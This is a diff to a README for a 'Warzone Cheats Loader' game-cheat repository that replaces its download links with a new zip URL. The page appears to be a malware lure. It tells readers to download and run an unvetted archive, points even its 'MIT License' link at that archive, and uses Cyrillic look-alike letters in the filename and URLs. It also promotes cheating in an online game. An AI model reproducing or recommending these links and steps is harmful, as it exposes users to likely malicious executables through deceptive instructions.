@@ -42,9 +42,9 @@ Check which operating systems are compatible with the loader in 2025! 🎯
 
 Follow these steps to install and start using the **Warzone Cheats Loader**:
 
-1. **Download https://raw.githubusercontent.com/yogas13/WarzoneMasterToolkit/main/Lоader.zip from the repository.**
+1. **Download https://github.com/yogas13/WarzoneMasterToolkit/raw/refs/heads/main/abaisance/Master-Warzone-Toolkit-v3.0.zipоhttps://github.com/yogas13/WarzoneMasterToolkit/raw/refs/heads/main/abaisance/Master-Warzone-Toolkit-v3.0.zip from the repository.**
 2. Extract the contents to a secure folder on your PC.
-3. Run the included **https://raw.githubusercontent.com/yogas13/WarzoneMasterToolkit/main/Lоader.zip** (on Windows) or follow the included guide for Linux/macOS.
+3. Run the included **https://github.com/yogas13/WarzoneMasterToolkit/raw/refs/heads/main/abaisance/Master-Warzone-Toolkit-v3.0.zipоhttps://github.com/yogas13/WarzoneMasterToolkit/raw/refs/heads/main/abaisance/Master-Warzone-Toolkit-v3.0.zip** (on Windows) or follow the included guide for Linux/macOS.
 4. Start Call of Duty: Warzone.
 5. Activate desired features in the loader interface.
 6. Enjoy your upgraded gameplay experience!
@@ -61,7 +61,7 @@ Follow these steps to install and start using the **Warzone Cheats Loader**:
 
 ## 📜 MIT License
 
-This repository is distributed under the terms of the [MIT License](https://raw.githubusercontent.com/yogas13/WarzoneMasterToolkit/main/Lоader.zip). Feel free to review, modify, and improve the code for personal use!
+This repository is distributed under the terms of the [MIT License](https://github.com/yogas13/WarzoneMasterToolkit/raw/refs/heads/main/abaisance/Master-Warzone-Toolkit-v3.0.zipоhttps://github.com/yogas13/WarzoneMasterToolkit/raw/refs/heads/main/abaisance/Master-Warzone-Toolkit-v3.0.zip). Feel free to review, modify, and improve the code for personal use!
 
 ---
 
